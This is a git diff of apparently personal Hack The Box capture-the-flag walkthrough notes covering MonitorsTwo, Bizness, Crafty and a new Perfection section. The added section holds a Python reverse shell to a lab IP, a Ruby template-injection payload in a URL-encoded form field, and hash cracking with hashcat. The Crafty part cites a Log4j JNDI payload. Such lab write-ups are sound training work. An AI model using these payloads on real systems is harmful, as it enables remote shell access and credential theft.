@@ -1,6 +1,6 @@
 # Easy\_machines
 
-## MonitorsTwo
+onitorsTwo
 
 1. Observe opened ports
    * `sudo nmap <ip>`
@@ -681,7 +681,7 @@ else:
 
 `nmap -sVC 10.10.11.252`
 
-<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### **/etc/hosts**
 
@@ -689,7 +689,7 @@ else:
 
 `10.10.11.252 bizness.htb`
 
-<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### website
 
@@ -710,7 +710,7 @@ else:
 
 
 
-![](<.gitbook/assets/image (9) (1).png>)\
+![](<.gitbook/assets/image (9) (1) (1).png>)\
 
 
 ### Weaponisation
@@ -736,7 +736,7 @@ else:
 
 
 
-<figure><img src=".gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -749,7 +749,7 @@ else:
 
 `cat /etc/passwd`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `cd /tmp`&#x20;
 
@@ -759,7 +759,7 @@ else:
 
 `cat AdminuserLoginData.xml`
 
-<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Obtained info:
 
@@ -775,7 +775,7 @@ requirePasswordChange="Y"
 
 {% embed url="https://hashes.com/en/tools/hash_identifier" %}
 
-<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 OK - it could be SHA1, but nothing valuable
 
@@ -793,7 +793,7 @@ OK - it could be SHA1, but nothing valuable
 
 **OK, some SHA is stored in c6650.dat file**
 
-<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `admin$"`**`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=`**
 
@@ -880,7 +880,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `python3 hashcsript.py`
 
-<figure><img src=".gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `su root`
 
@@ -888,7 +888,7 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 `cat root.txt`
 
-<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Crafty
 
@@ -898,16 +898,16 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 
 * nmap -sVC \<IP>
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 Website
 
-<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * sudo nano /etc/hosts
   * \<IP> crafty.htb
 
-<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * subpages
   * /coming-soon
@@ -919,7 +919,7 @@ Website
 
 *
 
-    <figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -930,7 +930,7 @@ Website
 * extended nmap for higher ports
 * `nmap -sVC 10.10.11.249 -p0-65535`
 
-<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * minecraft 1.16.5 Crafty server, Microsoft...
 
@@ -945,13 +945,13 @@ Minecraft Launcher
     * source env/bin/activate
     * pip install -r requirements.txt
 
-<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 * install requirements manually (if there were problems)
   * JDK 8
     * `wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz`
 
-<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -962,21 +962,21 @@ Logj4
   * change line 26 -> String cmd="cmd.exe"
     * because we are to attack Windows machine, not Linux (bin/sh)
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 * run exploit (poc.py)
   * we are getting error, so we should move the downloaded jdk1.8.0\_20 file to the folder (log4j-shell-poc)
   * \+ change name to **jdk1.8.0\_20**
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 * run exploit again
   * successful
   * exploit: **`Send me: ${jndi:ldap://10.10.14.3:1389/a}`**
 
-<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### User flag
 
@@ -986,7 +986,7 @@ Logj4
     * Enter your password: \<none>
     * Enter server host or host:port: \<HTB machine IP>
 
-<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Enter the exploit
   * **`${jndi:ldap://10.10.14.3:1389/a}`**
@@ -1023,3 +1023,111 @@ Finding vulnerability for PE
       * Playercounter.class
         * ADMIN PASSWORD
           * s67uH4zKcBIXw
+
+
+
+## Perfection
+
+### Reco
+
+#### nmap
+
+`nmap -sVC 10.10.11.253`
+
+* 22 SSH
+* 80 HTTP
+  * no redirect
+* Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
+  * F12 -> Network -> document
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+#### Hosts
+
+sudo nano /etc/hosts
+
+* \<IP> perfection.htb
+
+### Weaponisation
+
+#### Subpages
+
+* /about
+* /weigted-grade
+  * table form with submission possibility
+* /admin
+  * try this:
+    * get '/admin' do "Hello World" end
+  * same output for any subpage it doesnt know
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### Exploitation
+
+#### RS command
+
+* revshells.com
+  * \<IP> \<PORT> bash
+    * ```bash
+      python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+      ```
+
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+#### BurpSuite
+
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+* POST the calculator % send it to repeater
+
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+`category1=Test%0A<%25%3d+REVERSE SHELL+%25>`
+
+* Add the reverse shell payload
+
+category1=Test%0A<%25%3d+`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'`+%25>
+
+* URL Encode the content of payload (CTRL+U)
+
+```bash
+category1=Test%0A<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.6",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'`+%25>&grade1=1&weight1=100&category2=Maths&grade2=2&weight2=0&category3=Physics&grade3=2&weight3=0&category4=PE&grade4=1&weight4=0&category5=Algebra&grade5=3&weight5=0
+```
+
+* Run it in repeater to obtain the reverse shell on given port
+
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+`python3 -c 'import pty;pty.spawn("/bin/bash")'`
+
+<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+#### Finding the susan´s PW
+
+Susan hash password in the /home/susan/Migration/pupilpath\_credentials.db  file\
+`strings /home/susan/Migration/pupilpath_credentials.db`
+
+<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+* USER: **Susan Miller**
+* HASH: `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`
+
+The format of the password is in the /var/spool/mail/susan. You can crack it with hashcat in mask mode:
+
+`hashcat -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d`
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+### User Flag
+
+* ssh susan@10.10.11.253
+  * PW: susan\_nasus\_413759210
+* `cat user.txt`
+
+### Root Flag
+
+* The easiest way to obtain root flag
+* `sudo su`
+  * susan´s PW
+* `cd /root`
+* `cat root.txt`
